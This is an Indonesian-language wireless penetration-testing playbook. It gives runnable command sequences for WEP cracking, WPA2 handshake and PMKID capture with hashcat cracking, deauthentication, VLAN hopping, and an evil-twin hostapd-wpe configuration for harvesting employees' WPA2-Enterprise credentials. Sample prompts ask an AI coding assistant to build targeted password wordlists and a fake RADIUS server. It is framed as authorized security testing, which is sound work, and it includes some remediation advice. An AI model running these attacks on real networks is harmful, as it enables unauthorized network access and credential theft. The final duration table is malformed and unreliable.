# Network Pentest: Wireless / WiFi

**Target:** Access point (AP), jaringan WiFi korporat/guest  
**Akses tester:** Dalam jangkauan sinyal WiFi target  
**Durasi:** 2–4 hari  
**Hardware diperlukan:** Wireless adapter yang support monitor mode (Alfa AWUS036ACH, dsb)

---

## Skenario Umum

| Sub-skenario | Kondisi |
|-------------|---------|
| External attacker | Di parkiran/luar gedung, scan WiFi yang terpancar |
| Internal WiFi audit | Masuk gedung, test semua SSID yang ada |
| Guest network isolation | Test apakah guest WiFi benar-benar terisolasi |
| Rogue AP detection | Cari AP palsu yang mungkin sudah dipasang penyerang |

---

## Phase 1: Wireless Discovery

```bash
# Setup wireless adapter ke monitor mode
sudo airmon-ng start wlan0
# Interface baru: wlan0mon

# Scan semua AP di sekitar
sudo airodump-ng wlan0mon

# Fokus pada target spesifik
sudo airodump-ng wlan0mon \
  --bssid AA:BB:CC:DD:EE:FF \
  --channel 6 \
  -w captures/target_capture

# Kismet — lebih lengkap, GUI
kismet -c wlan0mon
```

**Prompt Claude Code:**
```
Airodump-ng output dari area parkiran kantor target (authorized pentest):

BSSID              PWR  Beacons  #Data  CH  ENC   ESSID
AA:BB:CC:11:22:33  -45      120    234   6  WPA2  CorpNetwork
AA:BB:CC:11:22:34  -60       80     12  11  WPA2  CorpGuest
AA:BB:CC:11:22:35  -75       40      5   1  WEP   Printer_WiFi  ← WEP!
DD:EE:FF:00:11:22  -80       20      0   6  WPA2  Unknown_AP     ← mencurigakan

Analisis:
1. SSID Printer_WiFi pakai WEP — langkah eksploitasi?
2. Unknown_AP tanpa nama jelas — apakah ini rogue AP?
3. CorpGuest — bagaimana test apakah benar-benar terisolasi?
4. Prioritaskan attack vector
```

---

## Phase 2: WEP Cracking (Jaringan Lama)

```bash
# WEP sudah sangat lemah — crack dalam menit
sudo airodump-ng -c 1 --bssid AA:BB:CC:11:22:35 \
  -w captures/wep_capture wlan0mon

# Inject packet untuk percepat pengumpulan IV
sudo aireplay-ng -3 -b AA:BB:CC:11:22:35 wlan0mon

# Crack WEP key setelah cukup IV (biasanya >50.000)
sudo aircrack-ng captures/wep_capture*.cap
```

---

## Phase 3: WPA2 PSK Cracking

```bash
# Capture 4-way handshake
sudo airodump-ng -c 6 --bssid AA:BB:CC:11:22:33 \
  -w captures/wpa2_capture wlan0mon

# Paksa client reconnect untuk dapatkan handshake
sudo aireplay-ng -0 5 -a AA:BB:CC:11:22:33 wlan0mon

# Atau gunakan PMKID attack (tidak perlu tunggu client)
sudo hcxdumptool -i wlan0mon -o captures/pmkid.pcapng \
  --enable_status=1

# Convert ke hashcat format
hcxpcapngtool -o captures/hash.hc22000 captures/pmkid.pcapng

# Crack dengan hashcat (GPU)
hashcat -m 22000 captures/hash.hc22000 /usr/share/wordlists/rockyou.txt

# Wifite — otomasi semua langkah di atas
sudo wifite --wpa --dict /usr/share/wordlists/rockyou.txt
```

**Prompt Claude Code:**
```
WPA2 handshake berhasil dicapture dari CorpNetwork.
Wordlist rockyou.txt (14 juta kata) tidak berhasil crack dalam 2 jam.

Saran lanjutan:
1. Wordlist yang lebih efektif untuk target korporat Indonesia
   (nama perusahaan + tahun, nama kota, pola umum password ID)
2. Rule-based attack dengan hashcat (toggle case, tambah angka)
3. PMKID attack sebagai alternatif
4. Estimasi waktu jika password 12 karakter random
5. Kapan harus berhenti dan beralih ke attack vector lain?
```

---

## Phase 4: Evil Twin / Rogue AP Attack

Buat AP palsu yang identik dengan target untuk mencuri credentials:

```bash
# Hostapd-wpe — Evil Twin dengan WPA2 Enterprise MITM
# Konfigurasi file hostapd-wpe.conf:
cat > hostapd-wpe.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=CorpNetwork          # Sama persis dengan target
channel=6
hw_mode=g
ieee8021x=1
eap_server=1
eap_user_file=hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
EOF

sudo hostapd-wpe hostapd-wpe.conf

# Deauth client dari AP asli agar konek ke evil twin
sudo aireplay-ng -0 0 -a AA:BB:CC:11:22:33 wlan0mon
```

**Prompt Claude Code:**
```
Setup Evil Twin untuk WPA2-Enterprise network (EAP-PEAP).
Tujuan: capture NTLMv2 credentials dari karyawan yang salah konek.

Bantu:
1. Konfigurasi hostapd-wpe yang benar untuk PEAP/MSCHAPv2
2. Cara setup RADIUS server palsu
3. Cara capture dan crack credential EAP
4. Bagaimana karyawan bisa mendeteksi evil twin? (untuk laporan)
5. Rekomendasi pencegahan: certificate validation, 802.1X mutual auth
```

---

## Phase 5: WPA2-Enterprise Testing

```bash
# Enumerate EAP methods yang didukung
sudo eap_buster -s CorpNetwork -b AA:BB:CC:11:22:33 -i wlan0

# Test certificate validation
# Apakah klien menerima certificate self-signed dari server palsu?

# Capture PEAP credential dengan hostapd-wpe
# Hasil: username + NTLMv2 hash
# Crack:
hashcat -m 5600 eap_credentials.txt /usr/share/wordlists/rockyou.txt
```

---

## Phase 6: Guest Network Isolation Testing

```bash
# Setelah connect ke CorpGuest, test apakah bisa reach internal network
ping 192.168.1.1        # Gateway internal
ping 192.168.1.10       # Domain Controller
nmap -sn 192.168.0.0/16  # Scan range internal

# Test apakah bisa akses sesama client di guest network
arp-scan -l
# Seharusnya hanya lihat gateway — jika lihat device lain = misconfigured

# Test bypass isolation
# Teknik: ARP spoofing, VLAN hopping, DHCP starvation
```

**Prompt Claude Code:**
```
Terhubung ke CorpGuest WiFi. Test isolation:
- Bisa ping 192.168.1.1 (gateway internal) → FAIL (benar)
- Bisa ping 10.0.0.1 (gateway lain) → SUCCESS ← masalah!
- Scan 10.0.0.0/24 → 12 host terdeteksi

Artinya: guest network bisa reach jaringan produksi 10.0.0.0/24.

Analisis:
1. Severity temuan ini
2. Apa yang bisa dilakukan penyerang dari guest network?
3. Apakah ini misconfigurasi firewall atau VLAN?
4. Rekomendasi fix: proper network segmentation
5. Cara verifikasi fix sudah benar
```

---

## Phase 7: VLAN Hopping

```bash
# Test 802.1Q VLAN tagging untuk akses VLAN lain
# Hanya efektif jika tester terhubung ke trunk port atau SW misconfigured

# DTP (Dynamic Trunking Protocol) exploitation
sudo yersinia -I  # interactive mode
# Pilih 802.1Q → kirim DTP frame

# Double tagging attack
# Frame dengan dua VLAN tag → bypass VLAN isolation
```

---

## Checklist Wireless Pentest

```
[ ] Discovery semua SSID di area
[ ] Identifikasi enkripsi (WEP/WPA/WPA2/WPA3/Enterprise)
[ ] Cek rogue AP yang mencurigakan
[ ] WEP cracking (jika ada)
[ ] WPA2-PSK: capture handshake + PMKID, crack wordlist
[ ] WPA2-Enterprise: test PEAP credential harvest
[ ] Evil Twin attack (jika dalam scope)
[ ] Guest network isolation test
[ ] VLAN hopping (jika akses ke port switch)
[ ] Deauth attack feasibility (DoS)
[ ] Laporan: semua AP yang ditemukan + risk rating
[ ] Rekomendasi: WPA3, certificate pinning, NAC
```

---

## Durasi Estimasi

| Sub-skenario | Durasi |
|-------------|-----------|----------|
| External WiFi audit | 1–2 hari | 2–3 hari |
| Full internal WiFi audit | 2–3 hari | 4–6 hari |
| WPA2-Enterprise testing | 3–4 hari | 6–8 hari |
